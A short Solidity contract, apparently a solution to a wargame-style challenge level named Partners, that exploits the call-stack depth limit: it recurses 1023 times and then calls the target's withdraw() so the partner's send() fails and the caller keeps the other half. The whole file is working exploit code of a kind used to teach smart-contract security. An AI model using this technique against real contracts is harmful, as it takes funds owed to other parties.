pragma solidity ^0.4.0;

import "../levels/Partners.sol";

contract PartnerAttack {

  // Withdraw from the contract without sending the other half to the partner.
  function attack(address _target, uint _count) {
    if(_count < 1023)
      this.attack.gas(msg.gas-2000)(_target, _count + 1);
    else
      Partners(_target).withdraw(); // will fail the second send()
  }
}
